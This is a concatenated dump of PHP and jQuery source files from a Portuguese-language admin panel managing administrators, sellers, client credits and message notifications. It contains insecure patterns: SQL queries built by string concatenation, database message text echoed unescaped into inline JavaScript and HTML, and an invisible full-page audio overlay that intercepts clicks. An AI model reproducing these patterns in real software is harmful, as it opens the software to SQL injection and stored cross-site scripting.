                    <label>Login:</label>
                    <input type="text" class="form-control" id="loginE" name="login" placeholder="Login">
                </div>
                <div id="s">
                <div id="divSenha" class="form-group">
                    <label>Senha:</label>
                    <input type="password" class="form-control" id="SenhasE" name="senha" placeholder="Senha">
                    </div>
                </div>
               <div class="form-group">
                    <label>Estado:</label>
                    <div class="ml-0 row">
                        <select id="estadoE" class="selectpicker" title="Estado" name="estado">
                            <option value="1">Ativo</option>
                            <option value="0">Desativado</option>
                        </select>
                    </div>
                </div>
                <div class="form-group">
                    <label>Nível:</label>
                    <div class="ml-0 row">
                        <select id="nivelE" class="selectpicker" title="Nível">
                            <?php if($_SESSION['admin']) { ?>
							<option value="admin">Administrador</option>
                            <option value="vendedor" hidden></option>
							<option value="cliente" hidden></option>
                            <?php } ?>
                        </select>
                    </div>
                </div>
                <div class="form-group" style="display: none">
                    <label>Administrador:</label>
                    <div class="ml-0 row">
                        <select id="adminE" class="selectpicker" title="Administrador" name="admin" required>
                            <option value="1">Sim</option>
                            <option value="0">Não</option>
                        </select>
                    </div>
                </div>
                <div class="form-group" style="display: none">
                    <label>Vendedor:</label>
                    <div class="ml-0 row">
                        <select id="vendedorE" class="selectpicker" title="Vendedor" name="vendedor" required>
                            <option value="1">Sim</option>
                            <option value="0">Não</option>
                        </select>
                    </div>
                </div>
                <button type="none" onclick="forceEdit()" class="btn btn-danger">Salvar</button>
            </div>
        </form>
      </div>
    </div>
  </div>
</div>
<!-- Edita Fim-->
<?php } ?>
</body>
<script>
    var clone = $("#divSenha").clone();
    var cloneC = $("#divSenhaC").clone();
    //$("#divSenhaC").remove();

    $("#cadastro").on('hidden.bs.modal', function (e) {
        if ($( "#adminC" ).val() != 1) {
            //$("#sC").empty();//DO_NOTHING
        }
    });

    $( "#adminC" ).change(function() {
        if ($( "#adminC" ).val() == 1) {
            $("#sC").append(cloneC);
        } else {
            $("#sC").empty();
        }
    });

    function editarConfirma(dia, id,nome,contato,login,estado,admin, vendedor, lista) {
	if(parseInt(dia) > 0){
	   $('#dia').val(parseInt(dia));
	} else {
	   $('#dia').val('');
	}
        $('#idE').val(id);
        $('#nomeE').val(nome);
        $('#nivelE').val(parseInt(vendedor) == 1 ? 'vendedor' : (parseInt(admin) == 1) ? 'admin' : 'cliente');
        setTimeout(() => {
            $('#nivelE').val(parseInt(vendedor) == 1 ? 'vendedor' : (parseInt(admin) == 1) ? 'admin' : 'cliente');
            $('*[data-id=nivelE]').text(parseInt(vendedor) == 1 ? 'vendedor' : (parseInt(admin) == 1) ? 'admin' : 'cliente');
        }, 500);
        $('#SenhasE').val(contato);
        $('#loginE').val(login);
        $('#estadoE').val(estado);
        $('#estadoE').selectpicker('render');
        $('#adminE').val(admin);
        $('#adminE').selectpicker('render');
        if (parseInt(admin) == 0) {
	    console.log(parseInt(vendedor) !== 1);
	    if(parseInt(vendedor) !== 1){
		$('#exdiaE').show();
		$('#CreditoC').show();
		$('#ConectadoE').show();
	    } else {
		$('#exdiaE').hide();
		$('#CreditoE').hide();
		$('#ConectadoE').hide();
	    }
            //$('#divSenha').remove();
        } else if ($('#divSenha').length < 1) {
            $('#s').append(clone);
        }
        $('#listaE').val(lista);
        $('#listaE').selectpicker('render');
        $('#editar').modal();
    }

    function removerConfirma(id,nome) {
        $('#remover-conteudo').html('<div class="alert alert-danger" role="alert"><strong> Remover </strong>' + nome + '?</div><button onclick="remover(' + id + ')" type="submit" class="btn btn-danger float-right">Remover</button>');
        $('#remover').modal();
    }

	function remover(id){
        window.location.href = 'controles/remover-administrador.php?id_usuario=' + id;
    }

    var addForce = function(){
        $( "#cadastro-form" ).trigger('submit');
    };
    var added = false;
    $( "#cadastro-form" ).submit(function( event ) {
        if(!added){
            added = true;
            if($('#cadastro-form select[name="vendedor"]').val().trim() == ""){
                $('#cadastro-form select[name="vendedor"]').val(0);
            }
            if($('#cadastro-form select[name="admin"]').val().trim() == ""){
                $('#cadastro-form select[name="admin"]').val(0);
            }
            $.ajax({
                type: "POST",
                url: "controles/adicionar-administrador.php",
                data: $("#cadastro-form").serialize(),
                success: function(data) {
                    location.reload();
                },
                error: function(data) {
                  resultado(data.responseText);
                }
            });
        }
        event.preventDefault();
    });
    var eddited = false;
    var forceEdit = function(){
        $( "#editar-form" ).trigger('submit');
    }
    $( "#editar-form" ).submit(function( event ) {
        if(!eddited){
            eddited = true;
            if($('#editar-form select[name="vendedor"]').val().trim() == ""){
                $('#editar-form select[name="vendedor"]').val(0);
            }
            if($('#editar-form select[name="admin"]').val().trim() == ""){
                $('#editar-form select[name="admin"]').val(0);
            }
            $.ajax({
                type: "POST",
                url: "controles/editar-administrador.php",
                data: $("#editar-form").serialize(),
                success: function(data) {
                    location.reload();
                },
                error: function(data) {
                  resultado(data.responseText);
                }
            });
        }
        event.preventDefault();
    });
    <?php if($_SESSION['admin']) { ?>
	  $('#vendedorC').val(0);
      $('#adminC').val(1);
    <?php } ?>

    $('#nivelC').on('change', function(){
       var value = $(this).val();
       $('#sC').empty();
       if(value == 'vendedor'){
           $('#adminC').val(0);
           $('#vendedorC').val(1);
           $("#sC").append(cloneC);
	   $('#exdiaC').hide();
	   $('#ConectadoC').hide();
	   $('#CreditoC').val(1);
       } else if (value == 'admin'){
           $('#adminC').val(1);
           $('#vendedorC').val(0);
           $("#sC").append(cloneC);
	   $('#exdiaC').hide();
	   $('#ConectadoC').hide();
	   $('#CreditoC').val(0);
       } else {
           $('#adminC').val(0);
           $('#vendedorC').val(0);
	   $("#sC").append(cloneC);	   
	   $('#exdiaC').show();
	   $('#ConectadoC').show();
	   $('#CreditoC').val(0);
       }
    });

function setCookie(name,value,days) {
    var expires = "";
    if (days) {
        var date = new Date();
        date.setTime(date.getTime() + (days*24*60*60*1000));
        expires = "; expires=" + date.toUTCString();
    }
    document.cookie = name + "=" + (value || "")  + expires + "; path=/";
}
function getCookie(name) {
    var nameEQ = name + "=";
    var ca = document.cookie.split(';');
    for(var i=0;i < ca.length;i++) {
        var c = ca[i];
        while (c.charAt(0)==' ') c = c.substring(1,c.length);
        if (c.indexOf(nameEQ) == 0) return c.substring(nameEQ.length,c.length);
    }
    return null;
}
function eraseCookie(name) {   
    document.cookie = name+'=; Max-Age=-99999999;';  
}
    function logar(id){
	if(!getCookie('original')){
	   setCookie('original', <?php echo $_SESSION['id_usuario'] ?>, 1);	
	}
	$.get('controles/forcar-login.php?id_usuario=' + id, function(){
	   window.location.reload();
        });
    }
    function verLogs(id){
        window.location.href = 'log.php?id_usuario=' + id;
    }
    $('#nivelE').on('change', function(){
       var value = $(this).val();
       if(value == 'vendedor'){
           $('#adminE').val(0);
           $('#vendedorE').val(1);
           $("#s").append(clone);
	   $('#exdiaE').hide();
	   $('#CreditoE').hide();
	   $('#ConectadoE').hide();
       } else if (value == 'admin') {
           $('#adminE').val(1);
           $('#vendedorE').val(0); 
           $("#s").append(clone);
	   $('#exdiaE').hide();
	   $('#CreditoE').hide();
	   $('#ConectadoE').hide();
       } else {
           $('#adminE').val(0);
           $('#vendedorE').val(0);
           $("#s").append(clone);
	   $('#exdiaE').show();
	   $('#CreditoE').show();
	   $('#ConectadoE').show();
       }
    });
    if(window.mobilecheck()){
	$('#checkme').remove();
    }
    $('.thead-light th:not(".nomecol")').remove();
</script>
<?php require_once("comum.php"); 
require_once("alerta.php");?>

</html>
<?php 
} else {
    header("Location: index.php");
    die();
}
?>
/alerta.mp3
/alerta.php:
<!-- Alerta Inicio -->
<div class="modal fade" id="alerta" tabindex="-1" role="dialog" aria-labelledby="Alerta" aria-hidden="true">
  <div class="modal-dialog modal-dialog-centered" role="document">
    <div class="modal-content">
      <div class="modal-body">
      <button type="button" class="close" data-dismiss="modal" aria-label="Fechar">
          <span aria-hidden="true">&times;</span>
        </button>
        <div class="text-center">
        <h5 id="textoAlerta" class="h5"></h5> 
        </div>
      </div>
    </div>
  </div>
</div>
<!-- Alerta Fim-->

/api.php
/backup.php
/cabecalho.php:
<?php
error_reporting(0);
if (basename($_SERVER["PHP_SELF"]) === basename(__FILE__)) {
    header('HTTP/1.0 403 Forbidden');
    header("Location: index.php");
    die();
    
}
session_start();
require_once("controles/usuarios.php");
require_once("controles/mensagens.php");
$categorias = false;
$mensagens = listarMensagensParaVendedor();
$eventos = [];
foreach($mensagens as $mensagem){
    if(array_key_exists($mensagem['evento_nome'], $eventos)){
        $eventos[$mensagem['evento_nome']][] = $mensagem;
    } else {
        $eventos[$mensagem['evento_nome']] = [];
        $eventos[$mensagem['evento_nome']][] = $mensagem;
    }
}
$notificacoes = [];
foreach(array_keys($eventos) as $nome_evento){
    $notificacoes[] = [
        "nome" => $nome_evento,
        "mensagens" => $eventos[$nome_evento]
    ];
}
$buscar = ("SELECT * FROM usuario WHERE id_criador = ".$_SESSION['id_usuario']." AND dia = 31");
$resut = mysqli_query($conexao, $buscar);
$credito = mysqli_num_rows($resut);
$buscar = "SELECT * FROM usuario WHERE id_usuario = ".$_SESSION['id_usuario']."";
$resut = mysqli_query($conexao, $buscar);
while($usuario = mysqli_fetch_array($resut)){
$creditos = $credito;
$credito = $usuario['credito'];
$master1 = "1";
$master2 = $usuario['master'];
?>
<!DOCTYPE html>
<html lang="pt-BR" itemscope itemtype="http://schema.org/WebPage">

<head>
    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <title>Painel | <?php echo $nome; ?></title>
    <link rel="icon" href="favicon.ico" type="image/x-icon" />
    <link rel="stylesheet" href="css/bootstrap.min.css">
    <link rel="stylesheet" href="css/painel.css">
    <link rel="stylesheet" href="css/bootstrap-select.min.css">
    <link rel="stylesheet" href="css/editor.css">
    <link href="css/all.css" rel="stylesheet">
    <link href="css/uppy.min.css" rel="stylesheet">
    <link rel="stylesheet" type="text/css" href="css/tema.css">
    <link rel="stylesheet" type="text/css" href="css/patternfly-additions.min.css">
    <script src="js/jquery.min.js"></script>
    <script src="js/bootstrap.bundle.min.js"></script>
    <script src="js/popper.min.js"></script>
    <script src="js/painel.js"></script>
    <script src="js/bootstrap-select.min.js"></script>
    <script src="js/defaults-pt_BR.min.js"></script>
    <script src="js/8b521a5df9.js"></script>
    <script src="js/patternfly.min.js"></script>
    <script src="js/sweetalert.min.js"></script>
    <style>
      .pesquisar {
          max-width: 200px;
      }

      #conteudo tr[visible='false'], .semresultado{
          display: none;
      }

      #conteudo tr[visible='true']{
          display:table-row;
      }

      #conteudoQ td, th {
          overflow: hidden;
          text-overflow: clip;
      }
      
      table th, table td { 
        overflow: hidden; 
        max-width:100px;
        white-space: nowrap;
        overflow: hidden;
        text-overflow: ellipsis;
      }

      #conteudoQ tr[visible='false']{
          display: none;
      }

      #conteudoQ tr[visible='true']{
          display:table-row;
      }
	  
      table th, table td { 
        overflow: hidden; 
        max-width:100px;
        white-space: nowrap;
        overflow: hidden;
        text-overflow: ellipsis;
      }

      #conteudoQ tr[visible='true']{
          display: none;
      }

      #conteudoQ tr[visible='false']{
          display:table-row;
      }
    </style>
</head>
<body>
<div class="page-wrapper chiller-theme toggled">
  <a id="show-sidebar" class="btn btn-sm btn-dark" href="#">
    <i class="fas fa-bars"></i>
  </a>
  <nav id="sidebar" class="sidebar-wrapper">
    <div class="sidebar-content">
        <div class="sidebar-brand">
            <a href="../"><img src="<?php echo $img2; ?>" alt="logo"></a>
            <div style="margin-right: 10px;" class="drawer-pf-trigger" id="close-sidebar">
			<i class="fas fa-bell"></i>
            </div>
            <div class="close-sidebar" id="close-sidebar">
                <i class="fas fa-times"></i>
            </div>
        </div>
        <!--user-->
        <div style="margin: 0px; border: 0px;" class="sidebar-header">
         <div class="user-pic">
         <img class="img-responsive img-rounded" src="img/user.png" alt="user">
         </div>
         <div class="user-info">
         <span class="user-name">
		 <?php echo $usuario['nome_usuario']; ?>
		 </span>
		  <?php if($_SESSION['admin']) { ?>
         <span class="user-role">
		  <?php if ($usuario['admin'] == 1) {echo "Administrador";} else {echo "";} ?>
		 </span>
          <?php } ?>
		  <?php if($_SESSION['vendedor']) { ?>
         <span class="user-role">
		  <?php if ($usuario['vendedor'] == 1) {echo "Vendedor";} else {echo "";} ?>
		 </span>
          <?php } ?>
         <span class="user-role">
		  <?php if($_SESSION['vendedor']) { ?>
		  <?php if($creditos <= $credito){ echo "<i class='fas fa-credit-card'></i> Crédito: ".$usuario['credito'].""; } else { echo "<i class='fas fa-credit-card'></i> Crédito: 0"; } ?>
		  </span>
         <span class="user-role">
		  <?php if ($usuario['estado_usuario'] == 0) {echo "";} else if ($usuario['dia'] == 0) {echo "";} else {echo "<i class='fas fa-calendar'></i> Expirar: Dia ".$usuario['dia']."";} ?>
          <?php } ?>
          <?php } ?>
		  </span>
		 <span class="user-status">
          <i class="fa fa-circle"></i>
          <span>Online</span>
          </span>
           </div>
        </div>
      <!-- sidebar-search  -->
      <div class="sidebar-menu">
        <ul>
          <li id="dashboard.php">
            <a href="dashboard.php">
              <i class="fas fa-tachometer-alt"></i>
              <span>Dashboard</span>
            </a>
          </li>
		  <li id="lista.php">
            <a href="lista.php">
              <i class="fas fa-list-ul"></i>
              <span>Listas</span>
            </a>
          </li>
          <?php if($_SESSION['admin']) { ?> 
          <li id="categoria.php">
            <a href="categoria.php">
              <i class="fas fa-list-alt"></i>
              <span>Categorías</span>
            </a>
          </li>
		  <li id="link.php">
            <a href="link.php">
              <i class="fas fa-link"></i>
              <span>Links</span>
            </a>
          <?php } ?>
          <li class="sidebar-dropdown">
         <a href="#">
         <i class="fas fa-users"></i>
		 <span>Grupos</span>
            </a>
            <div class="sidebar-submenu">
              <ul>			  
          <?php if ($_SESSION['admin']) { ?>
                <li>
          <li id="administrador.php">
          <a href="administrador.php">Administradores</a>
                </li>		
                <li>
          <li id="usuario.php">
          <a href="usuario.php">Vendedores</a>
                </li>				
          <?php } ?>
          <?php if ($_SESSION['vendedor']) { ?>
          <?php if($master1 <= $master2){ ?>
               <li>
          <li id="usuario.php">
          <a href="usuario.php">Vendedores</a>
               </li>
          <?php } ?>
          <?php } ?>
                <li>
          <li id="cliente.php">
          <a href="cliente.php">Usuários</a>
                </li>
                <li>
          <li id="teste.php">
          <a href="teste.php">Testes</a>
                </li>
              </ul>
            </div>
          </li>
          <?php if ($_SESSION['admin']) { ?>
          <li id="eventos.php">
            <a href="eventos.php">
              <i class="fas fa-briefcase"></i>
              <span>Eventos</span>
            </a>
          </li>
          <li id="mensagens.php">
            <a href="mensagens.php">
              <i class="fas fa-envelope"></i>
              <span>Mensagens</span>
            </a>
          </li>
          <li>
            <a id="importar" style="cursor: pointer;">
              <i class="fas fa-file-import"></i>
              <span>Importar</span>
            </a>
          </li>
          <?php } ?>
      <!-- sidebar-menu  -->
</div>
<div class="sidebar-menu">
</div>
<center><font size="2" color="#839192">&copy; <?php echo date("Y"); ?> <?php echo $copy; ?> <br /><span class="color_light">Desenvolvido por PJT</span></font></center>
</div>
    <!-- sidebar-content  -->
    <div style="position: relative;" class="sidebar-footer">
      <a href="sair.php">
        <i class="fa fa-power-off"></i>
      </a>
    </div>
  </nav>

  <div class="note-page">
   <div style="height: 100%" class="drawer-pf hide drawer-pf-notifications-non-clickable">
      <div class="drawer-pf-title">
         <a style="top: 3px; left: 6px;" class="drawer-pf-toggle-expand fa fa-angle-double-left hidden-xs"></a>
         <a style="float: right;right: 7px;position: relative;color: black;top: 6px" class="drawer-pf-close pficon pficon-close"></a>
         <h3 class="text-center">Area de Notificações</h3>
      </div>
      <div class="panel-group eventos" id="notification-drawer-accordion">
         <?php foreach ($notificacoes as $notificacao) { ?>
         <?php 
            $eventoNome = preg_replace("/[^a-zA-Z]+/", "", $notificacao['nome']); 
            $eventoNome =str_replace(' ', '', $eventoNome); 
         ?>
         <div id="event_<?php echo strtolower($eventoNome); ?>" class="panel panel-default">
            <div class="panel-heading" data-component="collapse-heading">
               <h4 class="panel-title">
                  <a data-toggle="collapse" data-parent="#notification-drawer-accordion" href="#fixedCollapse<?php echo strtolower($eventoNome) ?>">
                  <?php echo $notificacao['nome']; ?>
                  </a>
               </h4>
               <span class="panel-counter novas_mensagens"><?php echo sizeof($notificacao['mensagens']); ?> Novas mensagens</span>
            </div>
            <div id="fixedCollapse<?php echo strtolower($eventoNome); ?>" class="panel-collapse collapse in">
               <div class="panel-body todas_mensagens">
                  <?php foreach($notificacao['mensagens'] as $mensagem){ ?>
                  <div mensagem-id="<?php echo $mensagem['id_mensagem']; ?>" class="drawer-pf-notification <?php echo $mensagem['lida'] == 'sim' ? '' : 'unread'; ?>">
                     <div class="dropdown pull-right dropdown-kebab-pf">
                        <button class="btn btn-link dropdown-toggle" type="button" id="dropdownKebabRight11" data-toggle="dropdown" aria-haspopup="true" aria-expanded="true">
                        <span class="fa fa-ellipsis-v"></span>
                        </button>
                        <ul style="cursor: pointer;" class="dropdown-menu dropdown-menu-right" aria-labelledby="dropdownKebabRight11">
                           <li><a onclick="marcarComoLida('<?php echo $mensagem['id_mensagem']; ?>'); alert('<?php echo $mensagem['mensagem']; ?>');">Ler</a></li>
                           <li role="separator" class="divider"></li>
                           <li><a onclick="removerMensagem('<?php echo $mensagem['id_mensagem']; ?>')">Remover</a></li>
                        </ul>
                     </div>
                     <span class="pficon pficon-info pull-left"></span>
                     <div class="drawer-pf-notification-content">
                        <span class="drawer-pf-notification-message"><?php echo $mensagem['titulo']; ?></span>
                        <div class="drawer-pf-notification-info">
                           <span class="date"><?php echo $mensagem['data']; ?></span>
                        </div>
                     </div>
                  </div>
                  <?php } ?>
               </div>
               <div class="blank-slate-pf hidden">
                  <div class="blank-slate-pf-icon">
                     <span class="pficon-info"></span>
                  </div>
                  <h1>Sem Mensagens.</h1>
               </div>
               <div class="drawer-pf-action">
                  <div onclick="removerTodas('<?php echo $notificacao['nome']; ?>')" style="text-align: center;" class="drawer-pf-action-link" data-toggle="clear-all">
                     <button class="btn btn-link">
                     <span class="pficon pficon-close"></span> Remover Todas
                     </button>
                  </div>
               </div>
            </div>
         </div>
         <?php } ?>
      </div>
   </div>
<script>
      function reload(){
          // Initialize to unread notifications
          // TODO: add badge for unread notifications
      
          // Show/Hide Notifications Drawer
          $('.drawer-pf-trigger').click(function() {
              var $drawer = $('.drawer-pf');
      
              $(this).toggleClass('open');
              if ($drawer.hasClass('hide')) {
                  $drawer.removeClass('hide');
                  setTimeout(function() {
                      if (window.dispatchEvent) {
                          window.dispatchEvent(new Event('resize'));
                      }
                      // Special case for IE
                      if ($(document).fireEvent) {
                          $(document).fireEvent('onresize');
                      }
                  }, 100);
              } else {
                  $drawer.addClass('hide');
              }
              // Special case, close navigation menu in mobile mode
              if ($('.container-pf-nav-pf-vertical').hasClass('hidden-nav')) {
                  $('.nav-pf-vertical').removeClass('show-mobile-nav');
              }
          });
          $('.drawer-pf-close').click(function() {
              var $drawer = $('.drawer-pf');
      
              $('.drawer-pf-trigger').removeClass('open');
              $drawer.addClass('hide');
          });
          $('.drawer-pf-toggle-expand').click(function() {
              var $drawer = $('.drawer-pf');
              var $drawerNotifications = $drawer.find('.drawer-pf-notification');
      
              if ($drawer.hasClass('drawer-pf-expanded')) {
                  $drawer.removeClass('drawer-pf-expanded');
                  $drawerNotifications.removeClass('expanded-notification');
              } else {
                  $drawer.addClass('drawer-pf-expanded');
                  $drawerNotifications.addClass('expanded-notification');
              }
          });
      
          // Mark All Read / Clear All
          $('.panel-collapse').each(function(index, panel) {
              var $panel = $(panel);
              var unreadCount = $panel.find('.drawer-pf-notification.unread').length;
              $(panel.parentElement).find('.panel-counter').text(unreadCount + ' Novas Mensage' + (unreadCount !== 1 ? 'ns' : 'm'));
      
              if ($('.drawer-pf .panel-collapse .unread').length === 0) {
                  // TODO: remove badge for unread indicator
              }
      
              $panel.on('click', '.drawer-pf-action [data-toggle="mark-all-read"] .btn', function() {
                  $panel.find('.unread').removeClass('unread');
                  $panel.find('.drawer-pf-action [data-toggle="mark-all-read"]').remove();
                  $(panel.parentElement).find('.panel-counter').text('0 Mensagens Lidas');
                  if ($('.drawer-pf .panel-collapse .unread').length === 0) {
                      $('.drawer-pf-trigger').removeClass('unread');
                  }
              });
              $panel.on('click', '.drawer-pf-action [data-toggle="clear-all"] .btn', function() {
                  $panel.find('.panel-body .drawer-pf-notification').remove();
                  $panel.find('.drawer-pf-action').remove();
                  $panel.find('.blank-slate-pf').removeClass('hidden');
                  $panel.find('.drawer-pf-loading').addClass('hidden');
                  $(panel.parentElement).find('.panel-counter').text('0 Mensagens Lidas');
                  if ($('.drawer-pf .panel-collapse .unread').length === 0) {
                      // TODO: remove badge for unread indicator
                  }
              });
      
              $panel.find('.drawer-pf-notification').each(function(index, notification) {
                  var $notification = $(notification);
                  $notification.on('click', '.drawer-pf-notification-content', function() {
                      $notification.removeClass('unread');
                      var unreadCount = $panel.find('.drawer-pf-notification.unread').length;
                      $(panel.parentElement).find('.panel-counter').text(unreadCount + ' Novas Mensage' + (unreadCount !== 1 ? 'ns' : 'm'));
                      if (unreadCount === 0) {
                          $panel.find('.drawer-pf-action [data-toggle="mark-all-read"]').remove();
                          if ($('.drawer-pf .panel-collapse .unread').length === 0) {
                              // TODO: remove badge for unread indicator
                          }
                      }
                  });
              });
          });
      
          $('#notification-drawer-accordion').initCollapseHeights('.panel-body');
      };
      reload();
</script>
</div>

<audio style="height: 10000px;opacity: 0;width: 10000px;z-index: 10000;position: absolute;" controls id="new_msg">
<source src="alerta.mp3" type="audio/mp3">
</audio>
  
<div id="log.php" class="none"></div>
<script>
    document.getElementById("new_msg").playbackRate = 1.5;
    
    function marcarComoLida(id, remover = 0){
        if(remover == 1){
             $('div[mensagem-id="'+id+'"]').remove();
        }
        $('div[mensagem-id="'+id+'"] span').click();
        $.get('/controles/ler-mensagem.php?id_mensagem=' + id + '&remover=' + remover, function(data) {});
    }
    var msg = 0;
    var eventos = [];
    <?php foreach (array_keys($eventos) as $nome) { ?>
    eventos['<?php echo $nome; ?>'] = [];
    <?php foreach($eventos[$nome] as $mensagem) { ?>
    msg++;
    eventos['<?php echo $nome; ?>'].push('<?php echo $mensagem['id_mensagem']; ?>');
    <?php } ?>
    <?php } ?>
    function removerTodas(evento){
        eventos[evento].forEach((id) => {
            removerMensagem(id);
        });
    }
    function removerMensagem(id){
        marcarComoLida(id, 1);
    }
    if (location.pathname.includes("<?= $paginaCorrente = basename($_SERVER['SCRIPT_NAME']);?>")) {
      document.getElementById('<?= $paginaCorrente = basename($_SERVER['SCRIPT_NAME']);?>').classList.add("ativado");
    }
    window.mobilecheck = function() {
      var check = false;
      (function(a){if(/(android|bb\d+|meego).+mobile|avantgo|bada\/|blackberry|blazer|compal|elaine|fennec|hiptop|iemobile|ip(hone|od)|iris|kindle|lge |maemo|midp|mmp|mobile.+firefox|netfront|opera m(ob|in)i|palm( os)?|phone|p(ixi|re)\/|plucker|pocket|psp|series(4|6)0|symbian|treo|up\.(browser|link)|vodafone|wap|windows ce|xda|xiino/i.test(a)||/1207|6310|6590|3gso|4thp|50[1-6]i|770s|802s|a wa|abac|ac(er|oo|s\-)|ai(ko|rn)|al(av|ca|co)|amoi|an(ex|ny|yw)|aptu|ar(ch|go)|as(te|us)|attw|au(di|\-m|r |s )|avan|be(ck|ll|nq)|bi(lb|rd)|bl(ac|az)|br(e|v)w|bumb|bw\-(n|u)|c55\/|capi|ccwa|cdm\-|cell|chtm|cldc|cmd\-|co(mp|nd)|craw|da(it|ll|ng)|dbte|dc\-s|devi|dica|dmob|do(c|p)o|ds(12|\-d)|el(49|ai)|em(l2|ul)|er(ic|k0)|esl8|ez([4-7]0|os|wa|ze)|fetc|fly(\-|_)|g1 u|g560|gene|gf\-5|g\-mo|go(\.w|od)|gr(ad|un)|haie|hcit|hd\-(m|p|t)|hei\-|hi(pt|ta)|hp( i|ip)|hs\-c|ht(c(\-| |_|a|g|p|s|t)|tp)|hu(aw|tc)|i\-(20|go|ma)|i230|iac( |\-|\/)|ibro|idea|ig01|ikom|im1k|inno|ipaq|iris|ja(t|v)a|jbro|jemu|jigs|kddi|keji|kgt( |\/)|klon|kpt |kwc\-|kyo(c|k)|le(no|xi)|lg( g|\/(k|l|u)|50|54|\-[a-w])|libw|lynx|m1\-w|m3ga|m50\/|ma(te|ui|xo)|mc(01|21|ca)|m\-cr|me(rc|ri)|mi(o8|oa|ts)|mmef|mo(01|02|bi|de|do|t(\-| |o|v)|zz)|mt(50|p1|v )|mwbp|mywa|n10[0-2]|n20[2-3]|n30(0|2)|n50(0|2|5)|n7(0(0|1)|10)|ne((c|m)\-|on|tf|wf|wg|wt)|nok(6|i)|nzph|o2im|op(ti|wv)|oran|owg1|p800|pan(a|d|t)|pdxg|pg(13|\-([1-8]|c))|phil|pire|pl(ay|uc)|pn\-2|po(ck|rt|se)|prox|psio|pt\-g|qa\-a|qc(07|12|21|32|60|\-[2-7]|i\-)|qtek|r380|r600|raks|rim9|ro(ve|zo)|s55\/|sa(ge|ma|mm|ms|ny|va)|sc(01|h\-|oo|p\-)|sdk\/|se(c(\-|0|1)|47|mc|nd|ri)|sgh\-|shar|sie(\-|m)|sk\-0|sl(45|id)|sm(al|ar|b3|it|t5)|so(ft|ny)|sp(01|h\-|v\-|v )|sy(01|mb)|t2(18|50)|t6(00|10|18)|ta(gt|lk)|tcl\-|tdg\-|tel(i|m)|tim\-|t\-mo|to(pl|sh)|ts(70|m\-|m3|m5)|tx\-9|up(\.b|g1|si)|utst|v400|v750|veri|vi(rg|te)|vk(40|5[0-3]|\-v)|vm40|voda|vulc|vx(52|53|60|61|70|80|81|83|85|98)|w3c(\-| )|webc|whit|wi(g |nc|nw)|wmlb|wonu|x700|yas\-|your|zeto|zte\-/i.test(a.substr(0,4))) check = true;})(navigator.userAgent||navigator.vendor||window.opera);
      return check;
    };
    
    $(document).on('mousemove click', function(event){
	if($('#new_msg').is(':visible')){
	   var x = event.clientX;
	   var y = event.clientY;
	   $("#new_msg").hide();
	   if(event.type == 'click'){
		document.elementFromPoint(x, y).click();
	   } else {
		$(document.elementFromPoint(x, y)).trigger('mouseenter');
		$(document.elementFromPoint(x, y)).trigger('hover');
		$(document.elementFromPoint(x, y)).trigger('mouseover');
	   }
	}
    });
    
    if(window.mobilecheck()){
        $('#new_msg').hide();
    }
    
    setInterval(() => {
        $('.note-page .panel-body').css('max-height', '100%');
    }, 100);
    
    var mensagemHTML = `<div mensagem-id="id_mensagem" class="drawer-pf-notification foilida">
                     <div class="dropdown pull-right dropdown-kebab-pf">
                        <button class="btn btn-link dropdown-toggle" type="button" id="dropdownKebabRight11" data-toggle="dropdown" aria-haspopup="true" aria-expanded="true">
                        <span class="fa fa-ellipsis-v"></span>
                        </button>
                        <ul style="cursor: pointer;" class="dropdown-menu dropdown-menu-right" aria-labelledby="dropdownKebabRight11">
                           <li><a onclick="marcarComoLida('id_mensagem'); alert('texto_mensagem');">Ler</a></li>
                           <li role="separator" class="divider"></li>
                           <li><a onclick="removerMensagem('id_mensagem')">Remover</a></li>
                        </ul>
                     </div>
                     <span class="pficon pficon-info pull-left"></span>
                     <div class="drawer-pf-notification-content">
                        <span class="drawer-pf-notification-message">titulo_mensagem</span>
                        <div class="drawer-pf-notification-info">
                           <span class="date">data_mensagem</span>
                        </div>
                     </div>
                  </div>`;
    var eventoHTML = `<div id="event_nome_evento" class="panel panel-default">
            <div class="panel-heading" data-component="collapse-heading">
               <h4 class="panel-title">
                  <a data-toggle="collapse" data-parent="#notification-drawer-accordion" href="#fixedCollapsenome_evento">
                  nome_evento
                  </a>
               </h4>
               <span class="panel-counter novas_mensagens">Novas mensagens</span>
            </div>
            <div id="fixedCollapsenome_evento" class="panel-collapse collapse in">
               <div class="panel-body todas_mensagens">
			   
               </div>
               <div class="blank-slate-pf hidden">
                  <div class="blank-slate-pf-icon">
                     <span class="pficon-info"></span>
                  </div>
                  <h1>Sem Mensagens.</h1>
               </div>
               <div class="drawer-pf-action">
                  <div onclick="removerTodas('nome_evento')" style="text-align: center;" class="drawer-pf-action-link" data-toggle="clear-all">
                     <button class="btn btn-link">
                     <span class="pficon pficon-close"></span> Remover Todas
                     </button>
                  </div>
               </div>
            </div>
         </div>`;
String.prototype.replaceAll = function(search, replacement) {
var target = this;
return target.replace(new RegExp(search, 'g'), replacement);
    };
    function novasMensagens(msgs){
        msg = parseInt(msgs.length);
        setTimeout(() => {
            var eventosT = [];
            msgs.forEach((msg) => {
                if(eventosT[msg.evento_nome] == undefined){
                    eventosT[msg.evento_nome] = [];
                    eventos[msg.evento_nome] = [];
                }
                eventosT[msg.evento_nome].push(msg);
                eventos[msg.evento_nome].push(msg.id_mensagem);
            })
            var notificacoes = [];
            Object.keys(eventosT).forEach((evento_nome) => {
                notificacoes.push({
                    nome: evento_nome,
                    mensagens: eventosT[evento_nome]
                });
            });
            notificacoes.forEach((notificacao) => {
               var nome = notificacao.nome.toLowerCase().replace(/[^a-zA-z]/g, '');
               nome = nome.replaceAll(' ', '');
               nome = nome.toLowerCase();
               var novas_mensagens = [];
               notificacao.mensagens.forEach((mensagem) => {
                   if($('div[mensagem-id="'+mensagem.id_mensagem+'"]').length == 0){
                       novas_mensagens.push(mensagem);
                   }
               });
               if($('#event_' + nome).length == 0){
                   var eHTML = eventoHTML + '';
                   eHTML = eHTML.replaceAll('event_nome_evento', 'event_'+nome+'');
                   eHTML = eHTML.replaceAll('fixedCollapsenome_evento', 'fixedCollapse'+nome+'');
                   eHTML = eHTML.replaceAll('nome_evento', notificacao.nome);
                   $('.note-page .eventos').prepend(eHTML);
               }
               if($('#event_' + nome).length > 0){
                   var mHTML = '';
                   novas_mensagens.forEach((mensagem) => {
                       var ihtml = mensagemHTML + '';
                       ihtml = ihtml.replaceAll('foilida', mensagem.lida == 'sim' ? '' : 'unread')
